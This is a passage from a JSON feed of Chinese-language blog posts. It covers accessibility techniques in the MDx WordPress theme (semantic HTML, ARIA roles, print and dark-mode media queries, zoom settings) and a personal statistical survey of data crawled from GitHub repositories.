呢。</p>\n<h1>更进一步</h1>\n<p>我们的探索到这里就结束了，但如果你有兴趣，完全可以继续探索下去。我们的例子是一个非常简化的例子，在实际情况中，还有很多问题需要解决。比如，对于中文及类似语言，不存在拉丁语系的天然分词结构，而朴素贝叶斯的文本分类是基于单词的，那么<strong>中文的分词就会是个问题；</strong>再比如，对于朴素贝叶斯分类来说，<strong>词语之间的顺序是不影响分类结果的</strong>，但这就会导致“今天心情很好，但昨天不好”和“昨天心情很好，但今天不好”在朴素贝叶斯看来是一样的，要想获得更好的结果，我们必须<strong>考虑词语的顺序。</strong></p>\n<p>这些问题，今天我们就不再深究了，但你可以自己探索。比如，引入思路同样很简洁的马尔科夫链，我们就可以让计算机学会考虑词语间的顺序，不过那就会是另一个话题了。</p>\n","link":"https://flyhigher.top/develop/1989.html"},{"title":"MDx 中增强页面可访问性的细节","date":"2020-01-25 16:45:04","description":"\n<blockquote><p>这篇文章本来是打算发在 <a href=\"https://mdxblog.flyhigher.top/\">MDx Blog</a> 的，不过写到后来发现这篇文章相对来说还是有价值的，于是就将这篇文章转移到了无垠，MDx Blog 则不再发表这篇文章。</p></blockquote>\n<p>从 MDx 开发之初，增强页面的可访问性就被列为了一个重要目标。从 HTML 语义化，到 ARIA 地标，再到 <code>prefers-reduced-motion</code>，随着浏览器对于增强页面可访问性的支持功能越来越多，MDx 也在不断地更新，让更多的人都能毫无困难地浏览、查看由 MDx 渲染的网页。本文会详细说明一些 MDx 中增强页面可访问性的细节，<strong>如果你希望增强自己开发的网页的可访问性，本文可能会对你有所帮助。</strong></p>\n<h1>基础性增强</h1>\n<p>增强可访问性，最重要也是最基础的一点就是 HTML 语义化。通过使用 HTML 5 语义化标签和 ARIA Role 标签，我们可以很方便地<strong>将整个网页在语义上分为几部分，而这将有效地改善屏幕阅读器对网页的分析质量，使视力障碍用户更好地浏览网页。</strong></p>\n<h2>HTML 语义化</h2>\n<p><strong>HTML 语义化属于增强页面可访问性的基础中的基础。</strong>通过使用语义化的 HTML 标签，我们可以方便地为网页中的各部分标记功能而不影响页面样式。随着符合 HTML 5 的现代化网页成为主流，语义化标签已被很大一部分网站所支持，我也不过多赘述了。就举几个常用的“地标性”标签吧：</p>\n<ul>\n<li>\n<code>header</code> 标签标记页眉，默认样式同 <code>div</code>，不要把它和 <code>head</code> 搞混了</li>\n<li>\n<code>main</code> 标签标记页面的主要内容，默认样式同 <code>div</code>\n</li>\n<li>\n<code>article</code> 标签标记文章（在 HTML 5 中它指任何独立或可复用的文本），默认样式同 <code>div</code>\n</li>\n<li>\n<code>footer</code> 标签标记页脚，默认样式同 <code>div</code>\n</li>\n<li>\n<code>nav</code> 标签标记页面导航栏区域，默认样式同 <code>div</code>\n</li>\n<li>\n<code>aside</code> 标签标记侧栏，默认样式同 <code>div</code>\n</li>\n<li>\n<code>section</code> 标签标记“一组内容”，你可以把它看作是划定网页中一块区域的通用标签，默认样式同 <code>div</code>\n</li>\n</ul>\n<p>只要用这些标签替代 <code>div</code> 而不是无脑使用 <code>div</code> 就能提高页面的可访问性。MDx 使用了这些标签来增强页面的可访问性。</p>\n<h2>下一步，ARIA</h2>\n<p>有的时候，出于一些原因，我们没法使用语义化的 HTML 标签，或者没有合适的语义化标签来标记内容，这时候<strong>我们就需要使用 ARIA (Accessible Rich Internet Applications，可访问的富互联网应用)。</strong>ARIA 的基础用法很简单，只要在相应元素上加上 <code>role</code> 属性指定该元素的功能即可。下面是一个简单的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;div role=\"navigation\"&gt;\r\n  &lt;ul&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page A&lt;/a&gt;&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page B&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page C&lt;/a&gt;&lt;/li&gt;\r\n  &lt;/ul&gt;\r\n&lt;/div&gt;</pre>\n<p>通过 <code>role=\"navigation\"</code>，我们把一个 <code>div</code> 标记为了导航栏区域。实际上，对屏幕阅读器来说，这和 <code>nav</code> 标签在语义上是一致的。上一节中的例子都可以分别用以下 ARIA Role 表示：</p>\n<ul>\n<li><code>role=\"heading\"</code></li>\n<li><code>role=\"main\"</code></li>\n<li><code>role=\"article\"</code></li>\n<li><code>role=\"contentinfo\"</code></li>\n<li><code>role=\"navigation\"</code></li>\n<li><code>role=\"complementary\"</code></li>\n<li><code>role=\"region\"</code></li>\n</ul>\n<p>除此以外，MDx 还使用了 <code>role=\"banner\"</code> 和 <code>role=\"search\"</code> 来分别标记页面中的顶部栏和搜索表单。另外，<strong>有的时候 <code>role</code> 属性还需配合 <code>aria-*</code> 属性一同使用</strong>，具体规则比较复杂，我就不在这里赘述了，具体可参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles\">WAI-ARIA Roles – MDN</a>。</p>\n<h1>媒体查询来帮忙</h1>\n<p>CSS 的媒体查询其实是一个非常强大的特性，<strong>妥善利用其中的一些特性，我们可以在网页外观上大大增强网页的可访问性。</strong>除了已经烂大街的“对浏览器窗口大小”响应的媒体查询，我会介绍 3 个很少有网站充分利用的媒体查询。</p>\n<h2>print</h2>\n<p><code>print</code> 媒体查询其实已经“历史悠久”了，<strong>只要使用 <code>@media print {...}</code> 就可以创建只在打印页面时生效的样式。</strong>通过这种方式，我们可以让页面在打印时应用一套为打印优化的样式，增强页面在物理纸张上的可访问性。</p>\n<blockquote><p>维基百科是对打印样式做了单独适配的著名例子。</p></blockquote>\n<p><strong>由于在打印的情况下，页面已经离开了“可交互”的范围，还有分页这种在屏幕中无需考虑的问题，要让页面在物理纸张上仍能被轻松地阅读，我们需要做一些特殊的适配。</strong>直接来看一个例子吧。以下是 MDx 针对打印情况进行的一些特殊优化，样式的具体理由已经写在了注释中。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media print {\r\n    /*隐藏不必要的元素*/\r\n    header, .mdx-ad-after-article, .mdx-ad-in-article, .mdx-post-money, .page-footer-nav, .mdx-same-posts, .spanout button, .mdui-drawer, .mdui-overlay, .mdui-menu, .mdx-share-img-dialog, .mdx-share-wechat-dialog {\r\n        display: none!important;\r\n    }\r\n\r\n    /*使用下划线标记链接*/\r\n    article a {\r\n        text-decoration: underline!important;\r\n    }\r\n    /*由于纸张不可交互，在链接后显示链接到的 URL*/\r\n    article a::after {\r\n        content: \"(\" attr(href) \")\";\r\n    }\r\n\r\n    /*强制白底黑字*/\r\n    html &gt; body {\r\n        background-color: white!important;\r\n    }\r\n    article p {\r\n        color: rgba(0,0,0,.8)!important;\r\n    }\r\n\r\n    /*对于纸张上的长文章，衬线字体拥有更好的可读性。以下字体列表来自 fonts.css*/\r\n    article {\r\n        font: 13pt Georgia, \"Nimbus Roman No9 L\", \"Songti SC\", \"Noto Serif CJK SC\", \"Source Han Serif SC\", \"Source Han Serif CN\", STSong, \"AR PL New Sung\", \"AR PL SungtiL GB\", NSimSun, SimSun, \"TW\\-Sung\", \"WenQuanYi Bitmap Song\", \"AR PL UMing CN\", \"AR PL UMing HK\", \"AR PL UMing TW\", \"AR PL UMing TW MBE\", PMingLiU, MingLiU, serif!important;\r\n    }\r\n\r\n    /*除部分元素外，禁止在元素内部分页*/\r\n    * {\r\n        page-break-inside: avoid;\r\n    }\r\n    article p, article a, #comments, article {\r\n        page-break-inside: auto;\r\n    }\r\n}</pre>\n<p>MDx 自 1.9.3 版本起已经包含了对文章页的打印样式优化。可以很容易地看出，优化后的样式在物理纸张上将更容易阅读。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1345\" height=\"1602\" class=\"aligncenter size-full wp-image-1959\"></a>\n<h2>prefers-color-scheme</h2>\n<p><code>prefers-color-scheme</code> 是最近才被浏览器广泛支持的一个媒体查询，但它的功能却很强大：<strong>响应系统级黑暗模式。</strong>这样，我们可以在开启黑暗模式的系统中让网页具有更好的可读性。不过由于这个媒体查询直到最近才被广泛支持，因此大部分网站对此并没有进行适配。</p>\n<blockquote><p>一些适配这一特性的网站：少数派、微信公众平台（文章页）等。</p></blockquote>\n<p>通过像这样的媒体查询，我们可以在系统启用黑暗模式时让页面实时响应：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    body {\r\n        background-color: #212121;\r\n        color: rgba(255, 255, 255, .7);\r\n    }\r\n}</pre>\n<p><code>prefers-color-scheme</code> 一共有 3 个可能值：<code>no-preference</code>, <code>light</code> 和 <code>dark</code>。你也可以不像上面的例子那样默认使用亮色样式并在黑暗模式下启用黑暗样式，而可以反过来将黑暗样式作为默认，用亮色样式覆盖。在不支持的浏览器上将会显示默认样式（即媒体查询不会生效）。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<h2>prefers-reduced-motion</h2>\n<p>看名字就猜得出，<code>prefers-reduced-motion</code> 是和 <code>prefers-color-scheme</code> 师出同门的媒体查询。因此，和 <code>prefers-color-scheme</code> 一样，它也是在最近才获得了浏览器的广泛支持。它的作用也很强大：<strong>响应系统的“减弱动态效果”模式。</strong>这对某些不喜欢甚至无法接受动画的用户可能很有帮助。要知道，对有些用户来说这甚至是医疗上的必要。使用如下的媒体查询，我们可以在系统启用减弱动态效果模式时让页面实时响应，减弱动画：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-reduced-motion: reduce) {\r\n    /*只是一个示例，实际情况中可以保留一些淡入淡出效果*/\r\n    * {\r\n        transition: all 0s!important;\r\n        transform: none!important;\r\n    }\r\n}</pre>\n<p><code>prefers-reduced-motion</code> 只有 2 个可能值：<code>no-preference</code> 和 <code>reduce</code>，在不支持的浏览器上该媒体查询不会生效。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"792\" height=\"515\" class=\"aligncenter size-full wp-image-1962\"></a>\n<h1>黑暗模式适配</h1>\n<p>黑暗模式可不是简单地切换到黑底白字这么简单。<strong>单纯地使用黑底白字会导致页面元素之间对比度过高，文字刺眼，反而降低了页面的可访问性。</strong>我在下面总结了几条应用在了 MDx 中的黑暗模式优化规则和 Google 推荐的优化规则：</p>\n<p><strong>一是避免黑底白字。</strong>黑底白字看起来真的很难受，事实上，深灰和浅灰是黑暗模式最好的配色。比较下方例子里的两段文本，毫无疑问深灰色背景和浅灰色文字搭配的样式的可读性要比黑底白字高很多。（p.s. 有时候这条规则在白底黑字时也适用）</p>\n<p><strong>二是更改部分元素的亮度和对比度以增强可读性。</strong>你可能已经注意到了，下面优化的例子里标题文字的颜色改变了。很明显，未优化的黑暗模式中标题可读性不如优化的版本。在实际中，我们通常可以通过 CSS 滤镜来实现这一更改。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    h1 {\r\n        /*反相颜色后再将色相旋转 180 度，使亮度反相*/\r\n        filter: invert(1) hue-rotate(180deg);\r\n    }\r\n}</pre>\n<p><strong>三是避免让图片过亮。</strong>未经处理的图片通常会导致过高的对比度，降低可读性。在 MDx 中，我选择降低图片的亮度来避免图片刺眼，而 Google 的建议则是使图片灰度，不过这会影响图片的整体观感。无论是哪一种方案，都可以使用 CSS 滤镜来轻松实现。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    img { \r\n        /*MDx 方案*/\r\n        filter: brightness(.8);\r\n        /*Google 方案*/\r\n        filter: grayscale(.5);\r\n    }\r\n}</pre>\n<div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是未优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg?x-oss-process=image/interlace,1/quality,Q_90#\"></p>\n</div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是经过优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg?x-oss-process=image/interlace,1/quality,Q_90#\"></p>\n</div>\n</div>\n<h1>其他细节</h1>\n<p>还有一些细节，虽然简单，但不可或缺。我把一部分没有在上文提到的 MDx 中的细节列在了这里。</p>\n<p><strong>一是允许页面缩放。</strong>在开发响应式页面时，很多网站会在页面头部添加这样一个 <code>meta</code>：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"&gt;</pre>\n<p>这样的 <code>meta</code> 设定了页面的宽度，却也固定了页面的缩放比例，用户难以手动放大网页。<strong>这样的设置对一部分视力障碍用户非常不友好</strong>，以至于苹果决定在自家的浏览器上忽略禁止缩放的 <code>meta</code>。按照 Google 的推荐，如果你在 MDx 设置中启用了“允许页面缩放”，那么 MDx 会输出这样的 <code>meta</code> 标签，允许页面进行五倍以内的缩放：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=5\"&gt;</pre>\n<p><strong>尽管很多时候放大页面会导致页面结构被破坏，但这大大增强了页面的可访问性，利大于弊。</strong>因此，在 MDx 中，“允许页面缩放”是默认启用的。</p>\n<p><strong>二是在跨设备阅读时同步阅读记录。</strong>这属于 MDx 的“元老级”功能之一。注意到页面右上角的那个“在其他设备上继续阅读”的按钮了吗？如果你滚动页面后重新点击它，你会发现二维码发生变化了。通过在二维码中记录阅读进度，用户在扫描二维码切换设备阅读时，MDx 在新设备上会自动滚动到和原设备上一致的位置——好吧，目前基于百分比的算法在某些情况下可能不太准，但我已经设计了一个更复杂但更精确的阅读进度记录算法，之后就会更新到 MDx 中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"574\" class=\"aligncenter size-full wp-image-1976\"></a>\n<p><strong>三是避免 Web 字体阻塞渲染。</strong>如果你在页面中使用了 Web 字体，在字体加载完成之前，浏览器可能不会渲染任何文本，这就导致用户可能需要等待一段时间才能开始浏览网页。Google 推荐使用 <code>font-display: swap;</code> 来向浏览器指定网页的 Web 字体渲染策略。这一规则会提供一个比较短的等待周期，如果在这段时间内 Web 字体没有完成加载，那么浏览器会以 fallback 字体渲染文本。任意时刻一旦 Web 字体完成渲染，浏览器就会使用 Web 字体重新渲染文本。这在大多数情况下都能满足可访问性的需求。</p>\n<p><strong>四是确保 html 元素具有合适的 <code>lang</code> 属性。</strong>这一属性声明了页面的主要语言，浏览器可以据此调整渲染策略，或者触发自动翻译；屏幕阅读器也能更好地阅读网页。</p>\n<p><strong>五是确保页面主要内容在丢失/禁用了 Javascript 甚至 CSS 的情况下仍然可用。</strong>作为一个以内容为主的网站，MDx 在禁用了 Javascript 的情况下页面主要内容仍然可用。这不只是为了 SEO，更是为了保证页面的可访问性。的确，目前的情况下，如果开启了 Lazyload，MDx 在禁用 Javascript 的情况下图片的确无法显示，但我会在后续版本中尽可能的优化这一问题。</p>\n<h1>附录：媒体查询开发技巧</h1>\n<p>有的时候，光有 CSS 响应媒体查询还不够，我们可能需要在 Javascript 中实时响应媒体查询。用如下代码就可以很简单地响应媒体查询：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">let mql = window.matchMedia(\"(prefers-reduced-motion: reduce)\");\r\nmql.addListener(handleMediaChange);\r\n\r\n//在添加监听后先调用一次，获得当前查询结果\r\nhandleMediaChange(mql);\r\n\r\nfunction handleMediaChange(mql){\r\n    if(mql.matches){\r\n        //查询匹配\r\n    }else{\r\n        //查询不匹配\r\n    }\r\n}</pre>\n<p>在开发上述媒体查询的过程中，我们需要频繁地切换系统的相应模式或者调出打印窗口。<strong>实际上，Chrome 提供了更简单的调试方法：</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1946\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"723\" height=\"681\"></a>\n<p>只要在这里更改模式，相关媒体查询就能实时生效。这不会影响其他标签页，在关闭开发者工具之后也会自动恢复系统设置。</p>\n","link":"https://flyhigher.top/develop/1912.html"},{"title":"MDx Blog 现已随 MDx 1.9.5 发布","date":"2020-01-22 17:54:11","description":"<p>随着 MDx 发布 1.9.5 更新，<a href=\"https://mdxblog.flyhigher.top/\" rel=\"noopener noreferrer\" target=\"_blank\">MDx Blog</a> 现已建立。我将会在 MDx Blog 中分享一些开发故事并发布 MDx 更新日志。</p>","link":"https://flyhigher.top/diary/1905.html"},{"title":"GitHub 2019 统计无垠版","date":"2020-01-12 13:02:00","description":"\n<h1>缘起</h1>\n<p>2019 年底，我突发奇想想要自己统计一番 GitHub 上存储库的一些信息。尽管 GitHub 有自己的<a href=\"https://octoverse.github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">年度统计</a>，我还是想试着自己爬取一下，说不定能挖出什么有意思的信息，何况这是我第一次有机会处理比较大量的数据，也算是一种学习的过程吧。于是花了一下午写了个简单的爬虫（时间都花在增加 Rate Limit 上了…），然后扔在了两台服务器上开始跑（GitHub  API 真是好文明）。</p>\n<p>从 2019.11.21 3 时到 2020.1.12 24 时的 52 天 21 小时内，我的爬虫一共爬取了<strong>与 2,024,705 个用户有关<sup>*</sup>的 14,651,923 个公共存储库的基础信息</strong>，平均每秒爬取 3.2 个存储库。据 GitHub 的官方数据计算，我爬取了大约 15% 的存储库信息，但由于封禁库和私有库的数量未知，我暂时无法确定我爬取的存储库占公共库的比例。同时由于存储库数量较多，基本可以认为爬取到的样本在时间尺度上已经足够随机，可以通过统计得出一般结论。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"700\" height=\"606\" class=\"aligncenter size-full wp-image-1892\"></a>\n<p>爬到自己了，合影.jpg</p>\n<p>那么下面就来看看统计出来的一些结果吧。爬虫的技术细节和数据集下载放在文末。</p>\n<p>* 指这些用户拥有至少一个库</p>\n<h1>统计信息</h1>\n<p><strong>以下统计结果均基于已放于文末的数据集。</strong>由于爬虫爬取的时间跨度长，加上我并没有完整爬取 GitHub 所有存储库，因此我<strong>不能保证以下统计结果符合真实情况</strong>，各位可以下载数据集或自行爬取进行验证。</p>\n<h2>一些数据</h2>\n<div>\n<div>\n<div>\n<span>3,120,930</span><br>总爬取用户数</div>\n<div>\n<span>44.7%</span><br>的存储库创建<br>自 Fork</div>\n<div>\n<span>6.59%</span><br>的账户被删除或<br>封禁<sup>1</sup>\n</div>\n<div>\n<span>23,913</span><br>单用户拥有最大<br>库数量<sup>2</sup>\n</div>\n</div>\n</div>\n<p><sup>1</sup> 基于用户 ID 规律合理推断<br><sup>2</sup> 统计范围仅限于当前数据集</p>\n<p>比较出乎我意料的是创建自 Fork 的存储库的占比。我预估这样的存储库占比不会太低，但没有想到能接近一半。此外单用户拥有最大库数量也大大超出了我的预期，<a href=\"https://github.com/pombredanne\" rel=\"noopener noreferrer\" target=\"_blank\">pombredanne</a> 这个用户名下拥有将近 24k 的存储库，不过绝大多数都是 Fork 来的，在情理之中。此外<strong>这个数据集中</strong>拥有最多存储库的账户其实是一个组织 <a href=\"https://github.com/gitpan\" rel=\"noopener noreferrer\" target=\"_blank\">gitpan</a>，这个组织拥有 36,377 个存储库。</p>\n<h2>语言</h2>\n<p><canvas></canvas><br>\n首先必须要说明的是，在这个榜单中我<strong>排除了 HTML 和 CSS</strong>，因为在严格意义上它们不属于“编程语言”。如果把它们计算进来的话，分别有 640,368 个和 361,425 个存储库的主要语言分别是 HTML 和 CSS，这样在这份榜单中它们可以排到第 6 和 第 10 名。JavaScript 毫无疑问获得第一，第二名 Python 的热度则和 JavaScript 相差将近一半。<strong>此外还有 2,448,486 个存储库未能识别出语言，占比 16.7%。</strong>在上面的榜单之外，与机器学习和数据科学相关的语言还有 Jupyter Notebook 排名第 13，R 排名 20，Julia 排名 43。</p>\n<p>说实话这份排名和 GitHub 官方的排名<strong>差别很大</strong>，除了前三名，后面的基本都不太一样。我的排名统计结果完全基于 GitHub 对于存储库的主要语言识别，加上我的存储库数据不完整，和官方的数据不同是很正常的，可以做一个参考，但大概率还是官方排名更加准确。</p>\n<h2>许可证</h2>\n<p><canvas></canvas></p>\n<p>自 GitHub 推出许可证功能以来，拥有许可证的存储库比例升升降降，却始终没有超过一半。<strong>选择一个合适的许可证对项目的良好发展真的很有帮助</strong>，要了解如何选择合适的许可证，请参阅<a href=\"https://www.runoob.com/w3cnote/open-source-license.html\" rel=\"noopener noreferrer\" target=\"_blank\">这篇文章</a>。</p>\n<p><canvas></canvas></p>\n<p>对于拥有许可证的存储库，MIT<del> 麻省理工许可证 </del>总是占比最大的；第二则是 Apache-2.0 许可证。此外，WTFPL 许可证也挤入了前 15 名。</p>\n<h2>星标</h2>\n<p><canvas></canvas><br>\nStar 数量毫无疑问是一个存储库受欢迎程度的体现，而 Star 数高的项目基本上大家都了解过。<strong>截至爬取结束时间</strong>，GitHub 中 Star 数最多的库是 <a href=\"https://github.com/freeCodeCamp/freeCodeCamp\" rel=\"noopener noreferrer\" target=\"_blank\">freeCodeCamp</a> <del>非常完美的驼峰命名法</del>，其次则是著名项目 <a href=\"https://github.com/996icu/996.ICU\" rel=\"noopener noreferrer\" target=\"_blank\">996.ICU</a>。<a href=\"https://github.com/vuejs/vue\" rel=\"noopener noreferrer\" target=\"_blank\">Vue</a> 现在的 Star 数已经稳压 <a href=\"https://github.com/facebook/react\" rel=\"noopener noreferrer\" target=\"_blank\">React</a> 一头，Vue YES! 此外 <a href=\"https://github.com/sindresorhus/awesome\" rel=\"noopener noreferrer\" target=\"_blank\">awesome</a> 也挤进第七名。<br><canvas></canvas><br>\n由于 Star 需要时间积累，新项目的 Star 数量很可能是比不过老项目的，这就会导致有实力的新项目无法出现在榜单中。因此我还统计了日均 Star 数，试图通过日均 Star 数来反映项目受欢迎的程度。<strong>由于正热门的项目会比老牌热门项目有优势，这一项的统计范围是 2020-01-01 之前的所有存储库。</strong>996.ICU 和 freeCodeCamp 再次出现在前 10 名，而最近的热门项目 <a href=\"https://github.com/wenyan-lang/wenyan\" rel=\"noopener noreferrer\" target=\"_blank\">wenyan</a> 则飙升至第 2 名。此外还有 <a href=\"https://github.com/menzi11/BullshitGenerator\" rel=\"noopener noreferrer\" target=\"_blank\">BullshitGenerator</a>，即最近热门的“狗屁不通文章生成器”和 <a href=\"https://github.com/evil-huawei/evil-huawei\" rel=\"noopener noreferrer\" target=\"_blank\">evil-huawei</a> 分列第 3 和第 5 名。<br><canvas></canvas><br>\n说实话这个曲线<strong>比我预估的陡多了。</strong>你可能已经注意到了，这个图表的横轴不是均匀缩放的，实际上曲线要比看起来陡很多。同时受爬取方式的影响，GitHub 中 Star 数较少的存储库数量远比我爬取到的多。也就是说，<strong>实际情况下曲线远比这个图表上的陡。</strong>拿点 Star 不容易啊。</p>\n<h2>名称</h2>\n<p><canvas></canvas><br>\n终于知道了原来存储库的名称是有长度限制的…尽管最长有 100 位，<strong>大部分人还是喜欢 8 位长的存储库名。</strong>此外 1 位长的名称也比我预估的要多一些。举几个存储库名称长度为 100 的例子吧。</p>\n<ul>\n<li>testing-something-elsetesting-something-elsetesting-something-elsetesting-something-elsetesting-some</li>\n<li>acts_as_validated_config_so_app_will_not_run_in_random_situation_and_qa_gays_will_not_cry_to_you_whe</li>\n<li>……………………………………..________-………………………………-.—……</li>\n<li>—————————————————————————————————-</li>\n<li>nyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyan</li>\n</ul>\n<p>…创造力有够丰富的。</p>\n<p><canvas></canvas></p>\n<p>最近 GitHub 上有一种奇怪的风气，那就是建立 Awesome 合集<del>骗 Star</del>。看起来 Awesome 存储库满地都是，甚至还出现了关于 Awesome 的 Awesome 合集这种迷惑行为。于是我统计了一下，<del>还好，</del>占比<del>才</del> 0.5% 不到<del>，Awesomer 们任重而道远呐</del>。</p>\n<p><canvas></canvas></p>\n<p>尽管要在 github.io 上托管网站，存储库不一定要以 .github.io 结尾，但我还是统计了一下。拥有这类存储库的用户比我预想的要少一些，看来还有很多人没有完全发挥 GitHub 的完整实力啊<del>（比如我 Doge）</del>。同时<strong>这类存储库在所有存储库中占比 1.12%</strong>，看起来不多<del>，不过至少比 Awesome 多</del>。<br><canvas></canvas><br>\n看得出来 GitHub 对于用户名长度的限制是 1-40 位。用户名最短的 27 位占据了 <code>A-Z</code> 外加 <code>-</code> 的所有可能，而用户名最长的则是一个组织 <a href=\"https://github.com/UOIT-RESEARCH-database-information-group\" rel=\"noopener noreferrer\" target=\"_blank\">UOIT-RESEARCH-database-information-group</a>。不知道是巧合还是某种规律，<strong>最受欢迎的用户名长度和存储库名称长度一样，都是 8</strong>，有点意思。</p>\n<h2>创建时间</h2>\n<p><canvas></canvas><br>\n由于我并没有完整爬取所有存储库，我只能以相对值来统计每月新增存储库数量的变化趋势。<strong>在这个图表中，我将 2017-09 的数据设为了 100%。</strong>你一定一眼就能注意到 2017 年 6,7,8 月的“一柱擎天”。<del datetime=\"2020-02-05T09:18:30+00:00\">我第一次看到这个数据的时候的确愣了一下，不过就着这条新闻看就能明白为什么了：<strong>2017 年 6 月微软收购 GitHub。</strong></del></p>\n<blockquote><p>重新确认了一下，微软收购 GitHub 比这个高峰晚了一年，目前我对这个高峰没有什么很好的解释，如果你有什么思路的话欢迎评论。</p></blockquote>\n<p><strong>需要注意的是这张图表中我排除了 Fork 存储库</strong>，因为 Fork 存储库在 API 中的创建时间是原始存储库的时间，会影响整体趋势。此外，GitHub 中还有一个创建于 2007 年 10 月 29 日的存储库，那就是 <code>id: 1</code> 的…</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"mojombo\" data-mdxgithubp=\"grit\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/mojombo/grit\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>而它的创建者正是 GitHub 的创始人之一 Tom Preston-Werner。</p>\n<h1>一些有趣的结果</h1>\n<p>当初打算自己爬的目的之一就是想看看能不能挖出什么有意思的信息，结果真的有一些不挖不知道的信息。</p>\n<h2>奇怪的存储库</h2>\n<p>在爬取到的所有存储库中，<strong>有 3 个存储库是“无主”的</strong>，即它们的 owner 属性为空。这三个存储库的基本信息如下。</p>\n<div class=\"mdui-table-fluid mdui-table-hoverable\"><table class=\"mdui-table\">\n<thead><tr>\n<th>ID</th>\n<th>名称</th>\n<th>Forked</th>\n<th>Star</th>\n<th>语言</th>\n<th>许可证</th>\n<th>创建于</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>72385291</td>\n<td>vscode-redprl</td>\n<td>否</td>\n<td>10</td>\n<td>TypeScript</td>\n<td>apache-2.0</td>\n<td>2016-10-31 08:50:01</td>\n</tr>\n<tr>\n<td>181218346</td>\n<td>electron-sys</td>\n<td>否</td>\n<td>10</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-14 03:20:56</td>\n</tr>\n<tr>\n<td>181391880</td>\n<td>node-sys</td>\n<td>否</td>\n<td>6</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-15 09:33:08</td>\n</tr>\n</tbody>\n</table></div>\n<p><strong>更奇怪的是这三个存储库“无主”的情况还不一样。</strong>第一个存储库可以通过 <code>/repositories</code> 这个 GitHub API 找到， <a href=\"https://api.github.com/repositories?since=72385290\" target=\"_blank\" rel=\"noopener noreferrer\">这个链接</a>中的第一个存储库就是它；而其余两个存储库甚至无法在 <code>/repositories</code> API 中找到。不过就算能在 API 中找到第一个存储库，它的 <code>html_url</code>，即 <code>https://github.com//vscode-redprl</code> 仍然是不可访问的。这可能是 GitHub 早期的一个 Bug 导致的，不过我仍然对爬虫是如何找到这三个存储库的以及这些 Stars 是哪里来的感到好奇。</p>\n<h2>奇怪的用户名</h2>\n<p>在爬虫爬了一段时间以后，API 中突然开始出现大量的以 fdp 开头的 18 位乱码作为用户名的用户。这些用户拥有的存储库和 starred 的存储库都为 0，而他们的 <code>html_url</code> 为 404。以下是几个例子。</p>\n<ul>\n<li>fdpEpolGCEdQX4ZlRJ</li>\n<li>fdp8XaVrdtmDZnO5pR</li>\n<li>fdp8XRAGnwAOkTr2Ya</li>\n</ul>\n<p>由于我的爬虫并没有超过 Rate Limit，所以我排除了这是污染数据的可能。我怀疑这可能是某种 Bot 账户，于是一边更新爬虫过滤掉了这些用户，一边给 GitHub 支持发邮件问了具体情况。过了两天 GitHub 